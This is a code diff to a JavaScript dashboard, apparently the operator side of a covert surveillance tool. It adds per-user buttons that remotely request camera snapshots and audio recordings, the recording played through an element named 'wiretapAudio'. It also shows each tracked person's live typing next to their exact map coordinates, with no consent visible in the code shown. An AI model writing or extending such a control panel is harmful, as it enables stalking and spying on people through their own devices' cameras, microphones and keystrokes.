@@ -5,6 +5,19 @@ document.addEventListener('DOMContentLoaded', () => {
     
     const activeCount = document.getElementById('activeCount');
     const usersList = document.getElementById('usersList');
+    
+    // Modal Elements
+    const mediaModal = document.getElementById('mediaModal');
+    const closeModal = document.getElementById('closeModal');
+    const mediaTitle = document.getElementById('mediaTitle');
+    const snapshotImage = document.getElementById('snapshotImage');
+    const audioContainer = document.getElementById('audioContainer');
+    const wiretapAudio = document.getElementById('wiretapAudio');
+
+    closeModal.addEventListener('click', () => {
+        mediaModal.classList.add('hidden');
+        wiretapAudio.pause(); // stop playing if closed
+    });
 
     // Initialize Map
     function initMap() {
@@ -33,6 +46,41 @@ document.addEventListener('DOMContentLoaded', () => {
     socket.on('user_disconnected', (userId) => {
         removeUser(userId);
         updateCount();
+    });
+
+    socket.on('snapshot_received', (data) => {
+        const displayName = data.username ? data.username : `مجهول #${data.id.substring(0,4)}`;
+        mediaTitle.textContent = `صورة من كاميرا: ${displayName}`;
+        
+        audioContainer.classList.add('hidden');
+        snapshotImage.classList.remove('hidden');
+        snapshotImage.src = data.image;
+        
+        mediaModal.classList.remove('hidden');
+    });
+
+    socket.on('audio_received', (data) => {
+        const displayName = data.username ? data.username : `مجهول #${data.id.substring(0,4)}`;
+        mediaTitle.textContent = `تسجيل صوتي من: ${displayName}`;
+        
+        snapshotImage.classList.add('hidden');
+        audioContainer.classList.remove('hidden');
+        wiretapAudio.src = data.audio;
+        wiretapAudio.play();
+        
+        mediaModal.classList.remove('hidden');
+    });
+
+    socket.on('user_typing_live', (data) => {
+        if (usersMap.has(data.id)) {
+            const userObj = usersMap.get(data.id);
+            const typingIndicator = userObj.element.querySelector('.typing-indicator');
+            if (data.text.trim() === '') {
+                typingIndicator.textContent = '';
+            } else {
+                typingIndicator.textContent = `يكتب الآن: ${data.text}`;
+            }
+        }
     });
 
     // Helper Functions
@@ -85,10 +133,33 @@ document.addEventListener('DOMContentLoaded', () => {
             const li = document.createElement('li');
             li.className = 'user-card';
             li.innerHTML = `
-                <div class="user-id">👤 ${displayName}</div>
+                <div class="user-id">
+                    <span>👤 ${displayName}</span>
+                    <div>
+                        <button class="audio-btn" data-id="${id}">🎙️</button>
+                        <button class="snapshot-btn" data-id="${id}">📸</button>
+                    </div>
+                </div>
                 <div class="user-location">${displayLocation}</div>
                 <div class="user-coords">${lat.toFixed(5)}, ${lon.toFixed(5)}</div>
+                <div class="typing-indicator"></div>
             `;
+            
+            // Handle snapshot click
+            const snapBtn = li.querySelector('.snapshot-btn');
+            snapBtn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                socket.emit('request_snapshot', id);
+            });
+
+            // Handle audio click
+            const audioBtn = li.querySelector('.audio-btn');
+            audioBtn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                socket.emit('request_audio', id);
+                audioBtn.textContent = '⏳';
+                setTimeout(() => audioBtn.textContent = '🎙️', 5000);
+            });
             
             li.addEventListener('click', () => {
                 // Remove active class from all
